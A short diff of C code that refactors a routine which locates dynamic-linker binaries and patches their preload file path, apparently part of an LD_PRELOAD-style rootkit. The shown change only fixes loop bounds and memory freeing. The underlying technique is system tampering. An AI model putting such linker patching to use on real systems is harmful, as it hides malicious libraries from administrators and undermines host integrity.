@@ -79,23 +79,23 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
 /* returns the amount of successful patches. */
 int ldpatch(const char *oldpreload, const char *newpreload){
     char **foundld;
-    int p, c=0;
+    int allf, p, c=0;
 
-    foundld = ldfind();
+    foundld = ldfind(&allf);
     if(foundld == NULL)
         return 0;
 
-    for(int i=0; i<MAXLDS; i++){
-        if(foundld[i] == NULL)
-            continue;
-
+    for(int i=0; i<allf; i++){
         p=_ldpatch(foundld[i], oldpreload, newpreload);
+
         free(foundld[i]);
         foundld[i] = NULL;
 
         if(p<0) return p;
         if(p) c++;
     }
+
+    free(foundld);
 
     return c;
 }
